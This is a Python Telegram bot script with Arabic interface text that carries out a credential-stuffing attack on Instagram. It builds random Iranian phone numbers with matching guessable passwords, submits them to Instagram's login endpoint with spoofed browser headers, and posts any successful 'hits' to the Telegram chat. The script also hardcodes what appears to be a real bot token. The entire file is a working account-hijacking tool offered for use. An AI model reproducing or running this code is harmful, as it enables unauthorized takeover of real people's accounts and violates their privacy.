import os
import requests
from telebot import types
import telebot
from time import sleep
import random
from torrequest import TorRequest

os.system('pip install telebot')
os.system('pip install requests')
os.system('pip install pyTelegramBotAPI==3.7.6')
os.system('pip install torrequest')

token = '2043902364:AAGhAyHeXUccXvBTNm6jmHZ7cfSjXePvLtw'
bot = telebot.TeleBot(token)
r=requests.session() 
co = types.InlineKeyboardButton(text =" بدء الصيد ༒",callback_data = 'check')

#----#

# h  :'/
@bot.message_handler(commands=['start'])
def start(message):
    use = message.from_user.username
    fr = message.from_user.first_name
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 2
    maac.add(co)
    bjj = message.chat.id
    bot.send_message(message.chat.id,text=f"""<strong>
اهلا وسهلا <code>{fr}</code>, 
- - - - - - - - - - 
اداة الصيد ال vip فول اوبشن
- - - - - - - - - - 
مطور : @hasoni_lq
</strong>
    """,parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def qwere(call):
    if call.data == 'check':
    	log(call.message)
    if call.data == 'gen':
        gen(call.message)
def gen():
        chars = '1234567890'
        for user in range(int(100)):
                    us = str(''.join((random.choice(chars) for i in range(7))))
                    user = "+98916"+ us
                    passs = "0916" + us
                    with open('list.txt', 'a+') as xx:
                        xx.write(user+':'+passs+'\n')
                        xx.close()
def log(message):
 k = 0
 f = 0
 bot.send_message(message.chat.id,f"تم بدء تشغيل الاداة")
 url = "https://www.instagram.com/accounts/login/ajax/"
 gen()
 #by trakos
 ll = open("list.txt","r").read().splitlines()
 for l in ll:
    user = l.split(":")[0]
    password = l.split(":")[1]
    
    headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate,br",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
            "content-length": "475",
            "content-type": "application/x-www-form-urlencoded",
            #trakos here
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
            "x-csrftoken": "TRjdJzYvTFMREg6fj5rdMcb9MiuSjcs4",
            "x-ig-app-id": "936619743392459",
            "x-ig-www-claim": "hmac.AR14QEAb6GaYMOrrb0wjRYN3xSitFGLPN0x8ixWBFzqewQ1K",
            "x-instagram-ajax": "9f7a9dddd48c",
            "x-requested-with": "XMLHttpRequest"
        }
        
    data = {"username": user, "enc_password": "#PWD_INSTAGRAM_BROWSER:0:1589682409:"+password, "queryParams": "{}",
                "optIntoOneTap": "false"}
    login = r.post(url, headers=headers, data=data, allow_redirects=True)
    if login.text.find("userId") >= 0:
        print(login.text)
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @HASONI_LQ") 
    elif 'checkpoint_required' in login.text:
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @HASONI_LQ")
    else:
        print(login.text)
        k+=1
        sleep(2)
        mees = types.InlineKeyboardMarkup(row_width=1)
        buut = types.InlineKeyboardButton(f" مانصاد ༒ {k}",callback_data='jhi')
        buut5 = types.InlineKeyboardButton(f"𝒉𝒂𝒔𝒐𝒏𝒊 𝒂𝒍𝒏𝒂𝒋𝒂𝒓",callback_data='jhi5')
        buut1 = types.InlineKeyboardButton(f"نصاد ༒ {f}",callback_data='jhi1')
        mees.add(buut,buut1,buut5)
        bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**جار الصيد عزيزي✅**",parse_mode='markdown',reply_markup=mees) 
        

#داشوفك تريد تخمط
bot.polling(True)
